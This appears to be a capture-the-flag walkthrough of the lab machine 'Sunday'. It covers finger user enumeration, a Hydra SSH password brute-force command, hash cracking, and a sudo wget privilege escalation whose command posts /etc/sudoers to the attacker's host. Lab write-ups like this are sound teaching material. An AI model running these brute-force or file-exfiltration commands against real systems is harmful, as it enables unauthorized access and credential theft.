Recon & Enumeration

Use nmapAutomator to full scan for open ports and services:

The nmapAutomator Full scan reveals the presence of the Finger service, a protocol used for retrieving user information on remote hosts or network devices. Additionally, port 22022 is detected as open, indicating the utilization of SSH. To proceed, we are executing the finger-user-enum opens in a new tab Perl script, using the "names.txt" wordlist from SecLists opens in a new tab.

We will use Hydra to conduct a password brute-force attack on the 22022 SSH port on the target. After trying various users, we got from finger-user-enum, we gained the password for the username "sunny."

hydra -f -s 22022 -l sunny -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://10.10.10.76

The password for the "sunny" user on the target box is determined to be "sunday." We can now SSH into the target on port 22022.

A "backup" folder is discovered in the root directory while checking common files and directories.

The last two hashes were appended to a text file on our attack box, and John the Ripper was used to crack them using rockyou.txt wordlist.

The password for the sammy user is "cooldude!". We switch to the sammy user and runn sudo -l.

The user has the ability to execute Wget as root which can be exploited by using Wget's remote file download functionality, allowing us to replace the downloaded file, such as the /etc/sudoers file. This enables executing arbitrary commands as the root user through the compromised accounts of Sammy or Sunny.

First start a listener on our attack box.

Execute the command below on the target machine.

sudo wget --post-file=/etc/sudoers 10.10.14.8:4343

On our listener.
